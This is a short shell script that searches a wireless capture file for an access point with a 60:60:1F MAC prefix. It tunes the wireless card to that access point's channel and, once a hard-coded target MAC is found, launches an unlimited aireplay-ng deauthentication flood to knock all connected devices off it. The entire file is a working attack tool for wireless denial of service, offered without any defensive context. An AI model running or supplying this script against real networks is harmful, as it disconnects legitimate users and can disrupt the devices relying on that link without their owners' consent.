#!/bin/sh

	i=0
	while [ $i -eq 0 ]
	do
		apMAC=$(grep -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		apCh=$(grep -E "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv | cut -d "," -f 4)

echo $apCh
	# Search and trim MAC
	iwconfig wlan0 channel $apCh

		if [ "$apMAC" = "60:60:1F:04:74:40" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
			tput setaf 1; echo "Target AP Found!$(tput sgr 0)"
			echo $apMAC
			i=1
		fi	# If MAC not found, search again
	done

	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices
